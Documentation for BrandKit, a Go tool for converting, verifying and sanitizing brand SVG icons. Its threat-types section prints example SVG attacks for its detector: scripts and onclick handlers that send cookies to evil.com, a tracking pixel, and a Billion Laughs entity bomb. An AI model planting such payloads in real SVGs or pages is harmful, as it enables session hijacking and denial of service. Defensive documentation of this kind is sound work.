docs.title: BrandKit
docs.text: A Go toolkit for processing brand icons — analyzing, verifying, and converting SVG files. Use it as a CLI tool or as a library in your own Go programs.

docs.title: Features
docs.text:
• SVG Color Conversion — Convert icons to white, any hex color, or preserve original colors
  • Background Removal — Remove solid backgrounds while preserving transparency
  • Geometry Analysis — Analyze centering, padding, and viewBox optimization
  • Pure Vector Verification — Detect embedded raster data, base64, and data URIs
  • Security Scanning — Detect XSS threats, malicious scripts, and unsafe elements
  • Sanitization — Remove security threats while preserving valid SVG content
  • Brand Asset Library — 55+ brand icons with standardized variants

docs.title: CLI Installation
docs.text: go install github.com/grokify/brandkit/cmd/svg@latest

docs.title: Library Installation
docs.text: go get github.com/grokify/brandkit

docs.title: Basic Usage
docs.text:
# Create white icon on transparent background
brandkit white icon_orig.svg -o icon_white.svg

# Security scan SVG files
brandkit security-scan brands/

# Verify pure vector (no embedded raster)
brandkit verify icon.svg

docs.title: Getting Started
docs.text: This guide covers installation and basic usage of BrandKit.

docs.title: CLI Tool
docs.text:
Install the CLI using Go:

go install github.com/grokify/brandkit/cmd/svg@latest

The binary is named brandkit. Verify installation:

brandkit --version

docs.title: Go Library
docs.text:
Add BrandKit to your Go project:

go get github.com/grokify/brandkit

docs.title: Creating White Icons
docs.text:
The most common workflow is converting a color icon to white on a transparent background:

brandkit white icon_orig.svg -o icon_white.svg

This command:

  1. Removes any solid background
  2. Converts all colors to white (#ffffff)
  3. Centers the content in the viewBox
  4. Verifies the output is pure vector
  5. Scans for security threats

docs.title: Creating Color Icons
docs.text:
To create a centered icon preserving original colors:

brandkit color icon_orig.svg -o icon_color.svg

docs.title: Security Scanning
docs.text:
Scan SVG files for potential security threats:

# Scan a single file
brandkit security-scan icon.svg

# Scan a directory
brandkit security-scan brands/

# Generate JSON report
brandkit security-scan brands/ --report=security-report.json

docs.title: Verification
docs.text:
Verify that SVG files are pure vector (no embedded raster data):

# Single file
brandkit verify icon.svg

# Recursive directory scan
brandkit verify-all brands/

docs.title: Color Conversion
docs.text:
package main

import (
    "fmt"
    "github.com/grokify/brandkit/svg/convert"
)

func main() {
    result, err := convert.SVG("input.svg", "output.svg", convert.Options{
        Color:            "ffffff",
        RemoveBackground: true,
        IncludeStroke:    true,
        PreserveMasks:    true,
    })
    if err != nil {
        panic(err)
    }
    fmt.Printf("Converted: %s\n", result.OutputPath)
}

docs.title: Security Scanning
docs.text:
package main

import (
    "fmt"
    "github.com/grokify/brandkit/svg/security"
)

func main() {
    result, err := security.SVG("icon.svg")
    if err != nil {
        panic(err)
    }

    if result.IsSecure {
        fmt.Println("No threats detected")
    } else {
        for _, threat := range result.Threats {
            fmt.Printf("Threat: %s (%s)\n", threat.Description, threat.Type)
        }
    }
}

docs.title: Verification
docs.text:
package main

import (
    "fmt"
    "github.com/grokify/brandkit/svg/verify"
)

func main() {
    result, err := verify.SVG("icon.svg")
    if err != nil {
        panic(err)
    }

    if result.IsSuccess() {
        fmt.Println("Pure vector SVG")
    } else {
        for _, issue := range result.Issues {
            fmt.Printf("Issue: %s\n", issue)
        }
    }
}

docs.title: brandkit analyze
docs.text: Analyze SVG geometry including centering, padding, and viewBox optimization.

docs.title: Synopsis
docs.text: brandkit analyze [path] [flags]

docs.title: Description
docs.text:
Analyze SVG files to check:

  • ViewBox dimensions
  • Content centering
  • Padding percentages (left, right, top, bottom)
  • Suggested viewBox fixes for optimal centering

Can analyze a single file or all SVG files in a directory.

docs.title: Flags
docs.text: Flag Description --fix Show suggested viewBox fixes -h, --help Help for analyze

docs.title: Examples
docs.text:
Analyze a single file:

brandkit analyze icon.svg

Analyze all SVGs in a directory:

brandkit analyze brands/

Show suggested fixes:

brandkit analyze brands/ --fix

docs.title: Output
docs.text:
The analysis output includes:

File: brands/react/icon_orig.svg
  ViewBox: 0 0 100 100
  Content Bounds: x=10 y=15 w=80 h=70
  Padding: L:10.0% R:10.0% T:15.0% B:15.0%
  Centered: No (horizontal: yes, vertical: no)
  Suggested ViewBox: 10 15 80 70

docs.title: Output Fields
docs.text: Field Description ViewBox Current viewBox attribute Content Bounds Calculated bounding box of all visual content Padding Percentage of empty space on each side Centered Whether content is centered horizontally and vertically Suggested ViewBox Optimized viewBox for zero padding

brandkit analyze brands/ | grep "Padding:"

brandkit analyze brands/ | grep -A1 "Centered: No"

docs.title: brandkit color
docs.text: Create a centered color icon preserving original colors.

docs.title: Synopsis
docs.text: brandkit color <input> -o <output> [flags]

docs.title: Description
docs.text:
Shortcut for creating a well-sized, centered icon that preserves original colors. This is equivalent to:

brandkit process <input> -o <output> --remove-background --center --strict

The command performs these steps:

  1. Removes any solid background
  2. Preserves original colors (no color conversion)
  3. Centers the content in the viewBox
  4. Verifies the result is pure vector
  5. Scans for security threats (fails by default if threats found)

docs.title: Flags
docs.text: Flag Description -o, --output Output file path (required) --insecure Warn on security threats instead of failing -h, --help Help for color

Process a brand icon:

brandkit color brands/react/icon_orig.svg -o brands/react/icon_color.svg

Allow files with security warnings:

brandkit color icon_orig.svg -o icon_color.svg --insecure

docs.title: brandkit convert
docs.text: Convert SVG colors with fine-grained control.

docs.title: Synopsis
docs.text: brandkit convert <input> -o <output> [flags]

docs.title: Description
docs.text: Convert colors in an SVG file. Supports hex colors, shorthand hex, and named colors. Can optionally remove backgrounds and convert stroke colors.

docs.title: Flags
docs.text: Flag Description -o, --output Output file path (required) -c, --color Target color (hex or name, e.g., ffffff, white, ff5500) --remove-background Remove full-bleed background rect/circle --include-stroke Also convert stroke colors --preserve-masks Don't modify colors in mask/clipPath (default: true) -h, --help Help for convert

docs.title: Color Formats
docs.text:
The --color flag accepts:

Format Example Result 6-digit hex ffffff White 3-digit hex fff White Named color white White Mixed case FF5500 Orange

docs.title: Examples
docs.text:
Convert to white:

brandkit convert icon_orig.svg -o icon_white.svg --color ffffff

Convert using named color:

brandkit convert icon.svg -o output.svg --color black

Remove background and convert:

brandkit convert icon.svg -o output.svg --color ffffff --remove-background --include-stroke

Copy without color change (just reformats):

brandkit convert icon.svg -o output.svg

docs.title: Background Removal
docs.text:
The --remove-background flag removes full-bleed background elements:

  • <rect> elements covering the entire viewBox
  • <circle> elements covering the entire viewBox
  • Elements with fill colors that appear to be backgrounds

docs.title: Mask Preservation
docs.text: By default, colors inside <mask> and <clipPath> elements are not converted. This preserves the visual appearance of masked content. Use --preserve-masks=false to convert all colors.

docs.title: brandkit process
docs.text: Full SVG processing pipeline with all options.

docs.title: Synopsis
docs.text: brandkit process <input> -o <output> [flags]

docs.title: Description
docs.text:
Process an SVG file through the complete pipeline:

  1. Remove background — Remove full-bleed background elements (if --remove-background)
  2. Convert colors — Convert to target color (if --color specified)
  3. Center content — Analyze and fix viewBox for optimal centering (if --center)
  4. Verify vector — Ensure output is pure vector, no embedded raster (if --strict)

docs.title: Flags
docs.text: Flag Description -o, --output Output file path (required) -c, --color Target color (hex or name) --remove-background Remove full-bleed background rect/circle --include-stroke Also convert stroke colors --center Auto-fix viewBox for centering --strict Fail on embedded binary (default: true) -h, --help Help for process

docs.title: Examples
docs.text:
Full processing pipeline:

brandkit process icon_orig.svg -o icon_white.svg --color ffffff --center --strict

Remove background and convert:

brandkit process icon_orig.svg -o icon_white.svg --remove-background --color ffffff

Center without color conversion:

brandkit process input.svg -o output.svg --center --strict

docs.title: 1. Background Removal
docs.text:
When --remove-background is specified, the following elements are removed:

  • Full-bleed <rect> elements (covering entire viewBox)
  • Full-bleed <circle> elements
  • First child elements that appear to be backgrounds

docs.title: 2. Color Conversion
docs.text:
When --color is specified, all fill and stroke colors are converted:

  • Hex colors (#ffffff, #fff)
  • RGB colors (rgb(255,255,255))
  • Named colors (white, black)

Mask and clipPath elements are preserved by default.

docs.title: 3. Centering
docs.text:
When --center is specified:

  • Calculates content bounding box
  • Adjusts viewBox for optimal centering
  • Adds equal padding on all sides

docs.title: 4. Verification
docs.text:
When --strict is specified (default: true):

  • Detects embedded base64 images
  • Detects data URIs
  • Detects binary references
  • Fails if any embedded raster data found

docs.title: brandkit sanitize
docs.text: Remove security threats from SVG files.

docs.title: Synopsis
docs.text: brandkit sanitize <input> -o <output> [flags]

docs.title: Description
docs.text: Remove security threats from an SVG file while preserving valid content. By default, all threat types are removed. Use flags to selectively remove specific threat types.

docs.title: Flags
docs.text: Flag Description -o, --output Output file path (required) --remove-all Remove all threat types (default: true) --remove-scripts Remove script elements only --remove-event-handlers Remove event handler attributes only --remove-external-refs Remove external URLs only -h, --help Help for sanitize

docs.title: Examples
docs.text:
Remove all threats:

brandkit sanitize malicious.svg -o clean.svg

In-place sanitization (overwrites original):

brandkit sanitize icon.svg -o icon.svg

Remove only scripts:

brandkit sanitize icon.svg -o clean.svg --remove-scripts

Remove only event handlers:

brandkit sanitize icon.svg -o clean.svg --remove-event-handlers

docs.title: --remove-all (default)
docs.text:
Removes all detected threats:

Category Elements Removed Scripts <script> tags, javascript: URIs, vbscript: URIs Event Handlers onclick, onload, onerror, onmouseover, etc. External Refs href="http://...", xlink:href, foreignObject

docs.title: --remove-scripts
docs.text:
• <script> elements (inline and external)
  • Self-closing <script/> tags
  • javascript: URI schemes
  • vbscript: URI schemes
  • data:text/html URIs

docs.title: --remove-event-handlers
docs.text:
• All on* attributes: onclick, onload, onerror, onmouseover, etc.
  • Both quoted and unquoted attribute values
  • Handles nested quotes correctly

docs.title: --remove-external-refs
docs.text:
• href="http://..." and href="https://..."
  • xlink:href with external URLs
  • <foreignObject> elements
  • url(http://...) in style attributes
  • External <use> references

docs.title: Output
docs.text:
The sanitized SVG maintains:

  • Valid SVG structure
  • Internal ID references (#id)
  • Local file references
  • Inline styles (unless containing threats)
  • All visual elements

docs.title: Verification
docs.text:
After sanitization, verify the result:

brandkit sanitize icon.svg -o clean.svg
brandkit security-scan clean.svg

docs.title: Batch Processing
docs.text:
Sanitize all SVG files in a directory:

for svg in brands/*/*.svg; do
  brandkit sanitize "$svg" -o "$svg"
done

Or using Make:

make sanitize-all

Scan a directory:

docs.title: Description

Shortcut for the common workflow of creating a white icon on transparent background. This is equivalent to:

  5. Verifies the result is pure vector

docs.title: Release Notes — v0.1.0
docs.text:
January 24, 2026

Initial release of brandkit, a Go toolkit for processing brand SVG icons.

docs.title: CLI Commands
docs.text:
• brandkit white — One-command workflow to create white icons on transparent backgrounds (remove background, convert colors, center, verify)
  • brandkit convert — Convert SVG fill/stroke colors to any target color (hex or named), with background removal and mask preservation
  • brandkit process — Full pipeline: color conversion, viewBox centering, and pure vector verification
  • brandkit analyze — Analyze SVG geometry for centering offsets, padding percentages, and viewBox optimization
  • brandkit verify — Validate SVG files contain only vector elements (no embedded base64, data URIs, or binary references)

docs.title: Library Packages
docs.text:
• svg — Shared types (BoundingBox, ViewBox), SVG path parsing with full command support (M, L, H, V, C, S, Q, T, A, Z + relative variants), and file utilities
  • svg/analyze — Programmatic SVG geometry analysis with configurable thresholds for centering (5%), excessive padding (20%), and uneven padding (10%)
  • svg/convert — Color normalization (hex, shorthand, named colors), fill/stroke conversion, background element detection and removal, mask/clipPath preservation
  • svg/verify — Pure vector validation with pattern-based detection of embedded images, data URIs, and external binary references

docs.title: Brand Assets
docs.text:

  • Includes: Anthropic, AWS, Azure, GCP, Docker, Kubernetes, GitHub, OpenAI, and more

docs.title: Overview
docs.text: This release adds Go library APIs for programmatic icon processing, new CLI commands for color icon generation and recursive verification, 42 new color icon assets, and CI workflow for automated icon validation.

docs.title: Go Library API
docs.text:
Icon Retrieval (added in this release)

  • GetIcon(brand, variant) - retrieve icon by name and variant
  • GetIconWhite(brand) - white variant for dark backgrounds
  • GetIconColor(brand) - full color variant
  • GetIconOrig(brand) - original unmodified variant
  • ListIcons() - list all available brand names
  • IconExists(brand) - check if brand exists
  • NormalizeIconName(name) - convert aliases (golang→go, k8s→kubernetes)

Icon Processing

  • ProcessWhite(input, output) - create white icon on transparent background
  • ProcessColor(input, output) - create centered color icon preserving original colors

Recursive Verification

  • svg.ListSVGFilesRecursive(dir) - walk directory tree for SVG files
  • verify.DirectoryRecursive(dir) - verify all SVGs in directory tree

brandkit color icon_orig.svg -o icon_color.svg

Removes background, centers content, verifies pure vector while preserving original colors.

Interactive browser-based tool for picking coordinates from images to create SVG polygons. Useful for tracing brand icons and creating precise vector graphics.

  • Pin sharing across shapes for shared vertices

docs.text: Release date: 2026-02-26

docs.title: Overview
docs.text: This release adds comprehensive SVG security scanning and sanitization to detect and remove malicious elements that could enable XSS attacks or session hijacking. Security scanning is now integrated into the processing pipelines with full CI support.

docs.title: Security Scanning Package
docs.text:
New svg/security package for programmatic security scanning with 7 threat types:

Threat Type Severity Description ThreatScript Critical Script elements, javascript:/vbscript: URIs ThreatEventHandler Critical Event handler attributes (onclick, onload, etc.) ThreatExternalRef High External URLs, foreignObject elements ThreatXMLEntity High DOCTYPE/ENTITY declarations (XXE prevention) ThreatAnimation Medium Animation elements (animate, set, etc.) ThreatLink Medium Anchor elements ThreatStyleBlock Low Style elements

Scan Levels:

  • ScanLevelStrict — Detects all 7 threat types
  • ScanLevelStandard — Detects only critical/high severity threats

Functions:

  • security.SVG(path) — Scan single file
  • security.SVGWithLevel(path, level) — Scan with specified level
  • security.Directory(path) — Scan directory (non-recursive)
  • security.DirectoryRecursive(path) — Scan directory tree

docs.title: Sanitization
docs.text:
Remove threats while preserving valid SVG content:

  • security.Sanitize(input, output, opts) — Sanitize file
  • security.SanitizeContent(content, opts) — Sanitize in memory

Options:

  • RemoveScripts — Remove script elements only
  • RemoveEventHandlers — Remove on* attributes only
  • RemoveExternalRefs — Remove external URLs only
  • RemoveAll — Remove all threat types (default)

docs.title: Security Guide
docs.text: BrandKit includes comprehensive SVG security scanning and sanitization to protect against XSS attacks, session hijacking, and other malicious content.

docs.title: Overview
docs.text:
SVG files are XML documents that can contain executable content. While this enables powerful features like animation and interactivity, it also creates security risks when SVGs are:

  • Uploaded by users
  • Embedded in web pages
  • Used as brand assets in applications

BrandKit's security features detect and remove these threats while preserving valid SVG content.

docs.title: Scan for Threats
docs.text:
# Scan a single file
brandkit security-scan icon.svg

# Scan a directory
brandkit security-scan brands/

# Recursive scan with JSON report
brandkit security-scan-all brands/ --report=security-report.json

docs.title: Remove Threats
docs.text:
# Remove all threats
brandkit sanitize malicious.svg -o clean.svg

# Remove only critical threats
brandkit sanitize icon.svg -o clean.svg --remove-scripts --remove-event-handlers

docs.title: Integrated Pipeline
docs.text:
The white and color commands include security scanning by default:

# Fails if threats detected
brandkit white icon.svg -o icon_white.svg

# Warns but doesn't fail
brandkit white icon.svg -o icon_white.svg --insecure

docs.title: Threat Categories
docs.text: Category Severity Risk Scripts Critical XSS, session hijacking Event Handlers Critical XSS via user interaction External References High Data exfiltration, tracking XML Entities High XXE attacks, DoS Animation Medium Delayed XSS, UI manipulation Links Medium Phishing, navigation hijacking Style Blocks Low CSS injection, UI manipulation

docs.title: Strict Mode (Default)
docs.text:
Detects all 7 threat types. Use for maximum security:

brandkit security-scan icon.svg --strict

docs.title: Standard Mode
docs.text:
Detects only critical and high severity threats. Use when style blocks and animations are acceptable:

brandkit security-scan icon.svg --strict=false

docs.title: Documentation
docs.text:
• Threat Types — Detailed threat descriptions
  • Scanning — Scanning options and usage
  • Sanitization — Removing threats
  • Reports — JSON report format

docs.title: Library Usage
docs.text:
import "github.com/grokify/brandkit/svg/security"

// Scan
result, _ := security.SVG("icon.svg")
if !result.IsSecure {
    for _, threat := range result.Threats {
        fmt.Printf("%s: %s\n", threat.Type.Severity(), threat.Description)
    }
}

// Sanitize
security.Sanitize("input.svg", "output.svg", security.SanitizeOptions{
    RemoveAll: true,
})

docs.title: Sanitization
docs.text: BrandKit can remove security threats from SVG files while preserving valid content.

docs.title: Basic Sanitization
docs.text:
Remove all threats:

brandkit sanitize malicious.svg -o clean.svg

docs.title: In-Place Sanitization
docs.text:
Overwrite the original file:

brandkit sanitize icon.svg -o icon.svg

docs.title: Selective Removal
docs.text:
Remove only specific threat types:

# Scripts only
brandkit sanitize icon.svg -o clean.svg --remove-scripts

# Event handlers only
brandkit sanitize icon.svg -o clean.svg --remove-event-handlers

# External references only
brandkit sanitize icon.svg -o clean.svg --remove-external-refs

docs.title: Command Flags
docs.text: Flag Description -o, --output Output file path (required) --remove-all Remove all threat types (default: true) --remove-scripts Remove script elements only --remove-event-handlers Remove event handler attributes only --remove-external-refs Remove external URLs only

docs.title: Scripts (--remove-scripts)
docs.text: Element/Attribute Removed <script>...</script> Entire element <script/> Self-closing element href="javascript:..." Attribute value href="vbscript:..." Attribute value href="data:text/html..." Attribute value

docs.title: Event Handlers (--remove-event-handlers)
docs.text: Attribute Removed onclick="..." Entire attribute onload="..." Entire attribute onerror="..." Entire attribute onmouseover="..." Entire attribute All on*="..." Entire attribute

docs.title: External References (--remove-external-refs)
docs.text: Element/Attribute Removed href="http://..." Attribute href="https://..." Attribute xlink:href="http://..." Attribute <foreignObject> Entire element url(http://...) In style attributes

docs.title: What Gets Preserved
docs.text:
• Internal ID references (href="#myid")
  • Local file references (href="other.svg")
  • Inline styles (unless containing external URLs)
  • All visual elements (paths, shapes, text)
  • Valid SVG structure

docs.title: Using Shell
docs.text:
for svg in brands/*/*.svg; do
  brandkit sanitize "$svg" -o "$svg"
done

docs.title: Using Make
docs.text:
sanitize-all: build
    @for svg in $$(find brands -name "*.svg"); do \
        $(BUILD_DIR)/$(BINARY_NAME) sanitize $$svg -o $$svg.tmp && mv $$svg.tmp $$svg; \
    done

docs.title: Sanitize File
docs.text:
import "github.com/grokify/brandkit/svg/security"

result, err := security.Sanitize("input.svg", "output.svg", security.SanitizeOptions{
    RemoveAll: true,
})
if err != nil {
    log.Fatal(err)
}

fmt.Printf("Removed %d threats\n", len(result.ThreatsRemoved))

docs.title: Sanitize Content
docs.text:
content := `<svg onclick="alert(1)"><rect/></svg>`

cleaned, removed := security.SanitizeContent(content, security.SanitizeOptions{
    RemoveEventHandlers: true,
})

fmt.Println(cleaned)
// Output: <svg><rect/></svg>

fmt.Printf("Removed: %v\n", removed)

docs.title: Selective Sanitization
docs.text:
// Remove only critical threats
result, _ := security.Sanitize("input.svg", "output.svg", security.SanitizeOptions{
    RemoveScripts:       true,
    RemoveEventHandlers: true,
})

// Remove external refs only
result, _ := security.Sanitize("input.svg", "output.svg", security.SanitizeOptions{
    RemoveExternalRefs: true,
})

docs.title: Verification After Sanitization
docs.text:
Always verify the sanitized file:

brandkit sanitize input.svg -o output.svg
brandkit security-scan output.svg

Or programmatically:

// Sanitize
security.Sanitize("input.svg", "output.svg", security.SanitizeOptions{
    RemoveAll: true,
})

// Verify
result, _ := security.SVG("output.svg")
if !result.IsSecure {
    log.Fatal("Sanitization incomplete")
}

docs.title: Limitations
docs.text:
Sanitization removes threats but cannot guarantee:

  • Visual appearance is unchanged (removed elements may affect rendering)
  • All possible attack vectors are covered (SVG is complex)
  • Future vulnerabilities are addressed

For maximum security:

  1. Sanitize incoming SVGs
  2. Scan after sanitization
  3. Use Content Security Policy (CSP)
  4. Serve SVGs with proper MIME type

docs.title: Threat Types
docs.text: BrandKit detects 7 categories of security threats in SVG files.

docs.title: Scripts
docs.text:
Severity: Critical

Script elements enable arbitrary JavaScript execution, the most dangerous SVG threat.

docs.title: Detection Patterns
docs.text: Pattern Example Script elements <script>alert('XSS')</script> Self-closing scripts <script src="evil.js"/> JavaScript URIs href="javascript:alert(1)" VBScript URIs href="vbscript:msgbox(1)" Data HTML URIs href="data:text/html,<script>..."

docs.title: Attack Example
docs.text:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.location = 'https://evil.com/steal?cookie=' + document.cookie;
  </script>
  <rect width="100" height="100" fill="blue"/>
</svg>

docs.title: Mitigation
docs.text:
• Remove all <script> elements
  • Strip javascript:, vbscript:, and data:text/html URIs

docs.title: Event Handlers
docs.text:
Severity: Critical

Event handler attributes execute JavaScript when users interact with the SVG.

docs.title: Detection Patterns
docs.text:
Attribute Trigger onclick Mouse click onload Element loads onerror Error occurs onmouseover Mouse hover onfocus Element focused onmouseenter Mouse enters

All on* attributes are detected.

docs.title: Attack Example
docs.text:
<svg xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="blue"
        onclick="fetch('https://evil.com/log?data=' + document.cookie)"/>
</svg>

docs.title: Mitigation
docs.text:
• Remove all on* attributes
  • BrandKit handles quoted and unquoted values

docs.title: External References
docs.text:
Severity: High

External references can load remote content, enabling tracking and data exfiltration.

docs.title: Detection Patterns
docs.text: Pattern Example External href href="https://evil.com/track.svg" External xlink:href xlink:href="https://evil.com/image.png" foreignObject <foreignObject> elements URL in styles style="background: url(https://...)" External use refs <use href="https://evil.com/defs.svg#icon"/>

docs.title: Attack Example
docs.text:
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="https://tracker.com/pixel.gif?user=123"/>
  <rect width="100" height="100" fill="blue"/>
</svg>

docs.title: Mitigation
docs.text:
• Remove external URLs (http://, https://)
  • Remove <foreignObject> elements
  • Keep internal references (#id)

docs.title: XML Entities
docs.text:
Severity: High

XML entity declarations can enable XXE (XML External Entity) attacks and denial of service.

docs.title: Detection Patterns
docs.text: Pattern Risk <!DOCTYPE> Can reference external DTDs <!ENTITY> Can define recursive or external entities

docs.title: Attack Example (Billion Laughs DoS)
docs.text:
<!DOCTYPE svg [
  <!ENTITY x "AAAAAAAAAA">
  <!ENTITY x2 "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;">
  <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&x3;</text>
</svg>

docs.title: Mitigation
docs.text:
• Remove DOCTYPE declarations
  • Remove ENTITY declarations

docs.title: Animation
docs.text:
Severity: Medium

Animation elements can trigger actions over time, potentially executing delayed attacks.

docs.title: Detection Patterns
docs.text: Element Purpose <animate> Animates attributes <animateTransform> Animates transforms <animateMotion> Animates along path <animateColor> Animates colors <set> Sets values at time

docs.title: Risk
docs.text:
• Delayed execution of malicious behavior
  • UI manipulation to deceive users
  • Unexpected behavior in static contexts

docs.title: Mitigation
docs.text:
• Remove animation elements for static images
  • Only detected in strict mode

docs.title: Links
docs.text:
Severity: Medium

Anchor elements can navigate users away from your site, enabling phishing.

docs.title: Detection Patterns
docs.text: Pattern Example Anchor with href <a href="https://phishing.com">

docs.title: Risk
docs.text:
• Unexpected navigation
  • Phishing attacks
  • Social engineering

docs.title: Mitigation
docs.text:
• Remove <a> elements for static images
  • Only detected in strict mode

docs.title: Style Blocks
docs.text:
Severity: Low

Style blocks can contain CSS that manipulates the UI or exfiltrates data.

docs.title: Detection Patterns
docs.text: Element Risk <style> CSS injection

docs.title: Risk
docs.text:
• UI manipulation via CSS
  • CSS-based data exfiltration (font loading, etc.)
  • Usually benign (CSS classes for styling)

docs.title: Mitigation
docs.text:
• Remove <style> elements or inline styles
  • Only detected in strict mode
  • Often acceptable in controlled environments

docs.title: Tools
docs.text: BrandKit includes interactive tools for SVG development.

docs.title: Coordinate Picker
docs.text:
An interactive browser-based tool for creating precise SVG polygons from images.

Open Coordinate Picker

docs.title: Features
docs.text:
• Interactive Clicking — Click on images to place coordinate points
  • Multi-Shape Support — Create multiple shapes with color-coded markers
  • Pin Sharing — Share coordinate pins across shapes
  • Zoom Controls — 50% to 400% zoom for precise placement
  • SVG Export — Generate SVG polygon code from coordinates
  • State Serialization — Save and load coordinate sessions

docs.title: Use Cases
docs.text:
• Creating precise SVG icon shapes from reference images
  • Tracing logos for vectorization
  • Building complex multi-path SVG icons
  • Generating mathematically precise geometry

docs.title: Getting Started
docs.text:
1. Open the Coordinate Picker
  2. Load an image (drag & drop or file picker)
  3. Click to place coordinate points
  4. Adjust zoom for precision
  5. Copy generated SVG code

docs.title: Technical Details
docs.text:
The coordinate picker is built with:

  • TypeScript for type-safe coordinate handling
  • Vanilla JavaScript for zero-dependency runtime
  • HTML5 Canvas for image rendering
  • 100% test coverage
